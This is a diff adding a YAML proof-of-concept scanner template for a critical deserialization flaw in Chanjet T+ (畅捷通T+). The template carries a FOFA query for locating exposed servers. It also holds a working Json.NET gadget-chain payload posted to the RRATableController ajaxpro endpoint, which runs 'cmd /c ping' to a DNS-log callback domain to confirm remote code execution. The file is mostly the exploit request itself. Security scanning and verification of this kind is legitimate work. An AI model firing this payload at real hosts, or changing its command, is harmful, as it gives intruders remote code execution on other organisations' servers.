@@ -1,0 +1,26 @@
+id: poc-yaml-changjie-tplus-ufida-t-di-uip-rra-rratablecontroller-deserialization
+info:
+  name: 畅捷通T+ Ufida.T.DI.UIP.RRA.RRATableController 反序列化漏洞
+  severity: critical
+  tags:
+  - DNSLOG
+  - 反序列化
+  finger: 畅捷通T+
+  fofa: app="畅捷通-TPlus"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: POST
+  path: /tplus/ajaxpro/Ufida.T.DI.UIP.RRA.RRATableController,Ufida.T.DI.UIP.ashx?method=GetStoreWarehouseByStore
+  headers:
+    Content-Type: application/json
+  data: "{\n \"storeID\":{\n \"__type\":\"System.Windows.Data.ObjectDataProvider,\
+    \ PresentationFramework, Version=4.0.0.0, \nCulture=neutral, PublicKeyToken=31bf3856ad364e35\"\
+    ,\n \"MethodName\":\"Start\",\n \"ObjectInstance\":{\n \"__type\":\"System.Diagnostics.Process,\
+    \ System, Version=4.0.0.0, Culture=neutral, \nPublicKeyToken=b77a5c561934e089\"\
+    ,\n \"StartInfo\": {\n \"__type\":\"System.Diagnostics.ProcessStartInfo, System,\
+    \ Version=4.0.0.0, Culture=neutral, \nPublicKeyToken=b77a5c561934e089\",\n \"\
+    FileName\":\"cmd\", \"Arguments\":\"/c ping {{.domain}}\"\n }\n }\n }\n}"
+  expression: status_code == 200 && contains(body,"actorId或archivesId不能为空") && reverse.Verify()
+transport: http
